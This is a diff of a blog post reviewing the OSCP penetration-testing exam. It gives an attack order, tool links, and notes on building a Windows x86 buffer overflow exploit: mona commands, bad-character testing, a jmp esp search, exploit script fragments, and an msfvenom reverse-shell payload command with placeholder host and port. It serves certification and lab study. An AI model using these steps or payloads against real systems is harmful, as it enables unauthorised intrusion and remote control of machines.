@@ -94,7 +94,8 @@ This is an informal technical review of the Offensive Security Certified Profess
 
 ## Helpful Blogs, Tools & Scripts
 
-Cutting straight to the chase, here is a list of every helpful blog post, tool and script I utilized when preparing for and taking my OSCP exam.
+Here is a list of every helpful blog post, tool and script I utilized when preparing for and taking my OSCP exam.
+
 <p><br></p>
 <a href="https://github.com/21y4d/nmapAutomator">nmapAutomator</a> - Automates nmap scans to run in the background with different degrees of depth when scanning.
 <br>
@@ -129,21 +130,24 @@ Cutting straight to the chase, here is a list of every helpful blog post, tool a
 <a href="https://github.com/chrispetrou/shellback">Shellback</a> - Standalone python script for generating reverse shells on the fly.
 <p><br></p>
 More information regarding buffer overflow practice (as well as my personal notes) are included below as well.
-
-## Key Technical Skills to Pass
+<p><br></p>
+### Key Technical Skills to Pass
 Cutting straight to the chase, there are only five key technical skills you're really going to need to pass the OSCP exam. While it is recommended you focus heavily on these skills for the exam, it is absolutely still recommended that you practice machines in the PWK labs as well as other platforms in order to hone a wide variety of penetration testing techniques. That being side, the following five skills will likely be the most useful for passing the exam:
 <p><br></p>
+```bash
 1) Windows x86 Buffer Overflows 
 2) Common Web Enumeration (gobuster, Nikto, Burp Suite knowledge, etc.)
 3) Privilege Escalation (setuid Binaries, Unquoted Service Paths, Kernel Exploits, etc.)
 4) Searchsploit/Metasploit Usage
 5) Payload Generation (msfvenom)
+```	
 <p><br></p>
 
 ## Exam Review & Attack Strategy
 The exam itself can be intimidating at the start. Your heart may be racing with anticipation to begin hitting the exam labs, only to find yourself potentially having an imposter syndrome crisis 10 hours later while feeling burnt out. However, having a proper attack strategy is truly the best way to approach the exam.
-<p><br><p>
+<p><br></p>
 On my passing attempt, I attacked the machines in this order (granted, I received one machine from my first exam so I was able to get user on it immediately):
+<p><br></p>
 
 ```bash
 1) 25 Point Machine (Buffer Overflow)
@@ -156,8 +160,9 @@ On my passing attempt, I attacked the machines in this order (granted, I receive
 While I was performing the buffer overflow, I ran `nmapAutomator` in the background against all of the machines on timed intervals. I ran the first two scans against a 20 point machine and the 25 point machine at the start of the buffer overflow. Towards the end (around the time I was testing my final exploit), I ran the final two nmapAutomator scans on the remaining hosts. This left me with two detailed scans to review after completing my buffer overflow machine. With them, I was able to quickly navigate my attack vectors for these machines instead of waiting for their port scans to finish.
 
 The following is how I personally approached the buffer overflow machine on my second exam attempt. However, the rest of this post will delve deeper into my experience with the exam and my afterthoughts.
+<p><br></p>
 
-## Windows x86 Buffer Overflow Practice
+### Windows x86 Buffer Overflow Practice
 Alright, so buffer overflows can be totally intimidating. However, based on the TryHackMe - Buffer Overflow Prep room provided above, I've created a collection of notes that helped me pass my exam buffer overflow with ease.
 
 <p><br></p>
@@ -170,7 +175,10 @@ Note: Fuzzing is not required for the OSCP exam, so it is not covered in this po
 When performing crash replication, we first can run our existing proof of concept exploit against the vulnerable application. Upon verifying the application crashes as expected, we create a pattern of characters with the `pattern_create.rb` script from the Metasploit framework. Our pattern must be the same length as the payload that was used to cause the crash. This pattern will replace `pattern_create` in the code below. The `<buffer_string>` will also be replaced by the string belonging to the field we entered data into (i.e. `OVERFLOW1: <data_here>`, where `OVERFLOW1 = <buffer_string>`).
 <p><br></p>
 
-Pattern create: `/usr/share/metasploit-framework/tools/exploit/pattern_create.rb -l <crash_length>` 
+Pattern create:
+```bash
+/usr/share/metasploit-framework/tools/exploit/pattern_create.rb -l <crash_length>
+```
 <p><br></p>
 
 Script to crash application:
@@ -201,13 +209,15 @@ except:
  ```
 Upon crashing the application, we can run following `!mona` command in Immunity Debugger to determine the EIP offset.
 <p><br></p>
-
-`!mona findmsp -distance <crash_length>`
+```bash
+!mona findmsp -distance <crash_length>
+```
 
 <p><br></p>
 We can then grab the EIP offset from the following line in Immunity:
-
-`EIP Contains normal pattern : <offset_length>`
+```bash
+EIP Contains normal pattern : <offset_length>
+```
 <p><br></p>
 
 ### Controlling EIP
@@ -227,7 +237,7 @@ buffer = prefix + overflow + retn + padding + payload + postfix
 ```
 
 Assuming everything is overwritten properly, we can begin testing for bad characters.
-
+<p><br></p>
 ### Finding Bad Characters
 
 The following script was utilized from the TryHackMe - Buffer Overflow Prep room in order to test for bad characters. The script generates a full list of bad characters while excluding the null (`\x00`) value, since it is assumed to be disregarded by default.
@@ -252,13 +262,19 @@ Once the application has been crashed again, the following `!mona` commands can 
 <p><br></p>
 
 Set `!mona` configuration to use current working directory (this will be set to the name of the application, so if the application is `oscp_server.exe` the folder path will be `c:\mona\oscp_server.exe\<restofpath>`):
-`!mona config -set workingfolder c:\mona\%p`
+```bash
+!mona config -set workingfolder c:\mona\%p
+```
 
 Generate byte array in `!mona`:
-`!mona bytearray -b "\x00"`
+```bash
+!mona bytearray -b "\x00"
+```
 
 Compare byte array with `!mona` (`ESP_address` is the ESP address grabbed from Immunity):
-`!mona compare -f C:\mona\<app_name>\bytearray.bin -a <ESP_address>`
+```bash
+!mona compare -f C:\mona\<app_name>\bytearray.bin -a <ESP_address>
+```
 
 At this point, we can analyze the bad characters that are listed and add them to the following script.
 
@@ -276,20 +292,28 @@ From here, we can generate a new byte array with our now modified script. We wil
 
 1) Update proof of concept with new bad characters
 2) Crash program and update byte array with `!mona`:
-`!mona bytearray -b "\x00\<bad_chars>..\..\x\x"`
+```bash
+!mona bytearray -b "\x00\<bad_chars>..\..\x\x"
+```
 3) Perform the byte array comparison again:
-`!mona compare -f C:\mona\<appname>\bytearray.bin -a <ESP_address>`
+```bash
+!mona compare -f C:\mona\<appname>\bytearray.bin -a <ESP_address>
+```
 4) Verify "Unmodified" is displayed. If so, move on to getting jmp esp!
 5) If not, repeat steps until complete, insane, or completely insane.
-
+<p><br></p>
 ### Getting jmp esp
 With bad characters identified, we can run the following `!mona` command(s) to determine an appropriate jmp esp address for our exploit:
 
-`!mona jmp -r esp -cpb "\x00\<bad_chars>..\..\etc"`
+```bash
+!mona jmp -r esp -cpb "\x00\<bad_chars>..\..\etc"
+```
 
-OR:
+Or:
 
-`!mona find -s 'jmp esp' -type instr -cm aslr=flase,rebase=false,nx=false -cpb "\x00\<bad_chars>..\..\etc"`
+```bash
+!mona find -s 'jmp esp' -type instr -cm aslr=flase,rebase=false,nx=false -cpb "\x00\<bad_chars>..\..\etc"
+```
 Upon determining the address, we must convert it to Little Endian formatting by writing it in reverse (i.e. 0x62011af becomes \xaf\x11\x50\x62). We can then update the return (`retn`) value in our proof of concept to reflect the newly discovered address.
 
 ```python
@@ -299,8 +323,10 @@ retn = "<address_from_jmpesp_command>"
 ### Generating Shellcode 
 The following `msfvenom` command is exactly what I used when generating all of my shellcode for testing Windows x86 buffer overflows:
 
-`msfvenom -p windows/shell_reverse_tcp LHOST=<IP> LPORT=<PORT> -b '\x00\<bad_chars>..\..\etc' EXITFUN=thread -f python -v payload -a x86`
-
+```bash
+msfvenom -p windows/shell_reverse_tcp LHOST=<IP> LPORT=<PORT> -b '\x00\<bad_chars>..\..\etc' EXITFUN=thread -f python -v payload -a x86
+```
+<p><br></p>
 ### Final Exploit 
 Here's how everything should look once we're finished (NOPs were added for shellcode space):
 ```python
@@ -330,17 +356,19 @@ except:
     print("Could not connect.")
 ```
 
-## How to Enumerate Properly for the Exam
+### How to Enumerate Properly for the Exam
 When performing enumeration on the OSCP exam, remember to remain focused on the objective. 24 hours is more than enough time to pass the exam, so take your time and enumerate everything properly. If you think you're tracking on something, keep at it... And don't forget to use both Google and `searchsploit` to search for exploits. In my opinion, it's always better to check if something exists, even without the version number. That way you can at least determine if what you're searching for already has potential known vectors for exploitation. For example, if you encounter a website with a tag at the bottom that identifies its technology (ex: "High Security CMS"), trying looking it up to see if any exploits are already known. It will help alleviate some stress if you can determine your attack vectors as early as possible.
-
-## General Review & Afterthoughts
+<p><br></p>
+### General Review & Afterthoughts
 Overall, I had a pleasant experience with the OSCP certification exam. The PWK labs are engaging enough, and provide good baseline knowledge for what to expect on the exam. However, I would recommend practicing on sites such as HackTheBox and TryHackMe as well in order to better prepare yourself for any trickery the exam might throw at you. A final tip would be to try setting up your own "exam attempt" simulation by doing the following HackTheBox/TryHackMe machines in order:
 
-`1) [25pt] Buffer Overflow - TryHackMe: Buffer Overflow Prep (only solve one overflow to simulate an exam attempt)`
-`2) [10pt] Easy - HackTheBox: Bastard`
-`3) [20pt] Medium - HackTheBox: Haircut`
-`4) [20pt] Medium - HackTheBox: Chatterbox`
-`5) [25pt] Hard - HackTheBox: Bounty`
+```bash
+[25pt] Buffer Overflow - TryHackMe: Buffer Overflow Prep Lab
+[10pt] Easy - HackTheBox: Bastard
+[20pt] Medium - HackTheBox: Haircut
+[20pt] Medium - HackTheBox: Chatterbox
+[25pt] Hard - HackTheBox: Bounty
+```
 
 Keep in mind the "Easy-Hard" ratings are subjective to the OSCP exam difficulty, and not necessarily overall machine difficulty. If you have any additional questions about exam preparation, hacking, or just want to chat, feel free to message me on Discord (`farbs#6657`).
 
